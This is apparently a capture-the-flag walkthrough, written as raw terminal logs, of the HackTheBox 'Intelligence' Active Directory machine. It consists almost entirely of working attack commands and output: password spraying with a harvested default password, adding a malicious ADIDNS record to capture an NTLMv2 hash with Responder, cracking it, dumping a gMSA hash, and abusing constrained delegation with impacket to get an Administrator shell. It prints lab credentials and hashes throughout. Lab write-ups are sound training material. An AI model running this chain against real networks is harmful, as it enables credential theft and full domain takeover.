@@ -1,0 +1,211 @@
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //10.10.10.248 -N                                                              
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+We notice a predictable pattern from the 2 pdfs in the site.
+
+┌──(root㉿kali)-[/home/kali]
+└─# mkdir -p pdfs
+cd pdfs
+for y in {2020..2022}; do for m in {01..12}; do for d in {01..31}; do url="http://intelligence.htb/documents/$y-$m-$d-upload.pdf"; wget --spider -q "$url" && wget -q "$url"; done; done; done
+                                                                             
+Two PDFs are of use.
+We could use the following commands to find this easier.
+
+┌──(root㉿kali)-[/home/kali/pdfs]
+└─# exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
+   99 image files read
+
+
+for f in *pdf; do pdftotext $f; done
+head -n1 *txt
+
+
+New Account Guide
+Welcome to Intelligence Corp!
+Please login using your username and the default password of:
+NewIntelligenceCorpUser9876
+After logging in please change your password as soon as possible.
+
+Internal IT Update
+There has recently been some outages on our web servers. Ted has gotten a
+script in place to help notify us if this happens again.
+Also, after discussion following our recent security audit we are in the process
+of locking down our service accounts.
+
+
+┌──(root㉿kali)-[/home/kali/pdfs]
+└─# netexec smb 10.10.10.248 -u userlist -p 'NewIntelligenceCorpUser9876'
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
+...
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali/pdfs]
+└─# smbclient -L //10.10.10.248 -U Tiffany.Molina%NewIntelligenceCorpUser9876
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	IT              Disk      
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali/pdfs]
+└─# smbclient //10.10.10.248/IT -U Tiffany.Molina%NewIntelligenceCorpUser9876
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Apr 18 20:50:55 2021
+  ..                                  D        0  Sun Apr 18 20:50:55 2021
+  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
+
+		3770367 blocks of size 4096. 1454901 blocks available
+smb: \> 
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat pdfs/downdetector.ps1                                                                   
+��# Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
+try {
+$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+if(.StatusCode -ne 200) {
+Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
+}
+} catch {}
+}
+
+"We can leverage the permission (granted by default to
+authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone
+to add a new record that points to our own IP address. "                      
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 /usr/share/krbrelayx/dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web5 -d 10.10.14.16 -t A
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali/pdfs]
+└─# responder -I tun0 -v
+...
+     [+] Listening for events...
+
+[HTTP] Sending NTLM authentication request to 10.10.10.248
+[HTTP] GET request from: ::ffff:10.10.10.248  URL: / 
+[HTTP] NTLMv2 Client   : 10.10.10.248
+[HTTP] NTLMv2 Username : intelligence\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:1760cb5da5dd77ef:8C42506376D90554A381AE8567720085:0101000000000000F376E0DE531DDC013C65A862B45E67F100000000020008003900530033005A0001001E00570049004E002D0050005900510059005300420055005500540033004500040014003900530033005A002E004C004F00430041004C0003003400570049004E002D00500059005100590053004200550055005400330045002E003900530033005A002E004C004F00430041004C00050014003900530033005A002E004C004F00430041004C0008003000300000000000000000000000002000009C7E2D77F83A96F2B37454744113878C569BB93B1CC6711FBC1028D2313C3F060A001000000000000000000000000000000000000900340048005400540050002F0077006500620035002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+
+                      ┌──(root㉿kali)-[/home/kali]
+└─# echo 'Ted.Graves::intelligence:1760cb5da5dd77ef:8C42506376D90554A381AE8567720085:0101000000000000F376E0DE531DDC013C65A862B45E67F100000000020008003900530033005A0001001E00570049004E002D0050005900510059005300420055005500540033004500040014003900530033005A002E004C004F00430041004C0003003400570049004E002D00500059005100590053004200550055005400330045002E003900530033005A002E004C004F00430041004C00050014003900530033005A002E004C004F00430041004C0008003000300000000000000000000000002000009C7E2D77F83A96F2B37454744113878C569BB93B1CC6711FBC1028D2313C3F060A001000000000000000000000000000000000000900340048005400540050002F0077006500620035002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Mr.Teddy         (Ted.Graves)     
+1g 0:00:00:05 DONE (2025-09-04 00:25) 0.1831g/s 1980Kp/s 1980Kc/s 1980KC/s Mrz.deltasigma..Moti2536
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: intelligence.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.intelligence.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc.intelligence.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to GC LDAP server: dc.intelligence.htb
+INFO: Connecting to LDAP server: dc.intelligence.htb
+INFO: Found 43 users
+INFO: Found 55 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.intelligence.htb
+INFO: Done in 00M 08S
+INFO: Compressing output into 20250904002626_bloodhound.zip
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 /home/kali/gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb 
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::1dcabcce2cf522bae77d7dc622587879
+svc_int$:aes256-cts-hmac-sha1-96:331c8820d64c744ba82a28551b76dc2dc00991df0e253fa613d37c4684e045fd
+svc_int$:aes128-cts-hmac-sha1-96:40122d8d49ee8c46ea793c19b3a59d08
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getST intelligence.htb/svc_int$ -hashes :1dcabcce2cf522bae77d7dc622587879 -impersonate Administrator -spn WWW/dc.intelligence.htb -dc-ip 10.10.10.248
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+                                
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-wmiexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+intelligence\administrator
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
